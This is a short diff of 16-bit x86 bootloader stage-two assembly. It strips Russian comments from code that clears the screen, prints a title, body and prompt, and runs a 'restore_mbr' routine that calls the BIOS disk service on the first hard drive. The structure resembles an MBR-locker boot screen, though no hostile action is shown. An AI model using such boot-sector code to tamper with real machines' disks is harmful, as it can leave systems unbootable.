@@ -2,11 +2,9 @@ BITS 16
 ORG 0x8000
 
 start_stage2:
-    ; Очищаем экран
     mov ax, 0x0003
     int 0x10
 
-    ; Устанавливаем фон
     mov ah, 0x06
     mov al, 0
     mov bh, 0x00
@@ -14,19 +12,15 @@ start_stage2:
     mov dx, 0x184F
     int 0x10
 
-    ; Цвет текста
     mov ax, 0x0A00
     int 0x10
 
-    ; Выводим заголовок
     mov si, msg_title
     call print
 
-    ; Выводим тело
     mov si, msg_body
     call print
 
-    ; Выводим приглашение
     mov si, msg_prompt
     call print
 
@@ -57,6 +51,7 @@ restore_mbr:
     mov dl, 0x80
     int 0x13
     jc .error
+
     mov ax, 0x0000
     mov es, ax
     mov bx, 0x7E00
